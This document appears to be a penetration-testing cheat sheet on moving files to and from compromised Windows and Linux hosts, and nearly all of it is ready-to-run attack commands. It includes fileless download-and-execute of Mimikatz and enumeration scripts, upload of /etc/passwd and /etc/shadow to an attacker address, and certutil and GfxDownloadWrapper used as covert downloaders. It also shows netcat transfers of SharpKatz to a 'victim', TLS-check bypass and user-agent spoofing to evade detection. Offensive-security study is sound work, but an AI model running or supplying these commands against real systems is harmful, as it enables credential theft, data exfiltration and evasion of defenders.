# File Transfers
---

# Windows File Transfer
---
Basic file download:
```Powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

Fileless download and execution in memory:
```Powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

File download using iwr (can use iwr, curl or wget):
```Powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Bypassing this error:
```Powershell
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1```

add -UseBasicParsing like:
```Powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Bypassing this error:
```Powershell
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
```

add this like:
```Powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

# SMB
---
Copy file from SMB server:
```cmd
copy \\192.168.220.133\share\nc.exe
```

# FTP
---
Download file from FTP server in powershell:
```Powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```

Download file using FTP client:
```cmd
GET file.txt
```

# Upload
---
Upload a file using PSUpload:
```Powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

Base64 encode a file then upload:
```Powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Upload files using SMB:
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

Upload a file to an FTP server using powershell:
```cmd
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Upload a file using FTP client:
```cmd
PUT c:\windows\system32\drivers\etc\hosts
```

# Linux File Transfer
---
Download a file using wget:
```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

Download a file using cURL:
```shell
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Fileless download and execution in memory using cURL:
```shell
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Download a file using bash:
```shell
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

Downloading files over SSH using scp:
```shell
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

Downloading a file using certutil:
```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

# File Upload
---

Upload multiple files using cURL:
```shell
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Upload a file over SSH using scp:
```shell
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```

Code
---
Download a file using Python2:
```shell
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

Download a file using Python3:
```shell
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

PHP download with File_get_contents():
```shell
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

PHP download with Fopen():
```shell
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

PHP download and pipe to bash:
```shell
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

Download a file with ruby:
```shell
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

Download a file with perl:
```shell
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

Download a file using JS and cscript.exe;
```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

Upload a file using Python:
```shell
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

# Netcat and Ncat
---
Open a listener on the victim machine with netcat:
```shell
nc -l -p 8000 > SharpKatz.exe
```

Open a listener on the victim machine with ncat:
```shell
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Send a file to the victim with netcat:
```shell
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

Send a file to the victim with ncat:
```shell
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

# Protection

Encrypt a file on Windows using Invoke-AESEncryption:
```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 
```

Encrypt a file on Linux using openssl:
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

Decrypt the file:
```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
```

# Evading Detection
---
List blacklisted user-agents:
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Request with chrome user-agent:
```shell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```

Transferring a file using GfxDownloadWrapper:
```shell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```


